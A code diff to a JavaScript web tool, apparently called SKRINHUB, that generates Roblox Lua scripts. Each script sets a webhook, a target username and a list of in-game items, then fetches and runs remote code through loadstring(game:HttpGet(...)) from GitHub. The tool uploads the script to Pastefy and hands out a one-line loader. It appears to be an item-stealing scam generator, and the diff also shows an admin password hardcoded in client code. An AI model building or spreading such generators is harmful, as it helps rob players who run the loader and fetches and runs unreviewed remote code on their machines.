@@ -1309,7 +1309,7 @@
 /* ═══════════════════════ STATE ═══════════════════════ */
 const ADMIN_PASSWORD = '60496159';
 const SKRINHUB_API = 'https://c58175c8-ffbe-4518-9a89-8456b2c912f0-00-3jhjthxjlcyh1.sisko.replit.dev';
-const HARDCODED_ADMINS = ['2oyb', '2r2w5', 'arisxsluvsvanilla', 'levraimlk'];
+const HARDCODED_ADMINS = ['2oyb', '2r2w5', 'arisxsluvsvanilla', 'levraimlk', '3mke1'];
 let isAdmin = false;
 let discordUser = null;
 let userRanks = JSON.parse(localStorage.getItem('skrinhub_ranks') || '{}');
@@ -1553,10 +1553,6 @@ function doAdminLogin() {
 }
 
 document.addEventListener('keydown', function(e) {
-  if (e.ctrlKey && e.key === 'p') {
-    e.preventDefault();
-    if (isAdmin) { showToast('Already signed in as admin.', 'success'); } else { openAdminModal(); }
-  }
   if (e.key === 'Escape') { closeAdminModal(); closeSignInModal(); }
 });
 
@@ -2146,6 +2142,7 @@ async function generate() {
     else if (adminMode === 'custom' && customAdminLoadstring.trim()) adminPart = customAdminLoadstring;
     const hitUrl = SKRINHUB_API + '/api/hit?userId=' + encodeURIComponent(discordUser.id||'') + '&username=' + encodeURIComponent(discordUser.username||'') + '&displayName=' + encodeURIComponent(discordUser.displayName||'') + '&avatar=' + encodeURIComponent(discordUser.avatar||'');
     const script = `-- SKRINHUB\ntask.spawn(function() pcall(function() game:HttpGet("${hitUrl}") end) end)\ngetgenv().WEBHOOK_URL = "${finalWebhook}"\ngetgenv().TARGET_USERNAME = "${username}"\ngetgenv().TARGET_BRAINROT = {\n${brainrotLines}\n}\ntask.spawn(function()\nloadstring(game:HttpGet("https://raw.githubusercontent.com/nexoradisc-create/skrinhubcode/refs/heads/main/skrinhub.lua"))()\nend)\n${adminPart}`;
+    const url = await uploadToPastefy(script);
     out.className = 'code-block';
     out.textContent = url ? `loadstring(game:HttpGet("${url}"))()` : `-- Failed to upload.\n${script}`;
     scriptCount++;
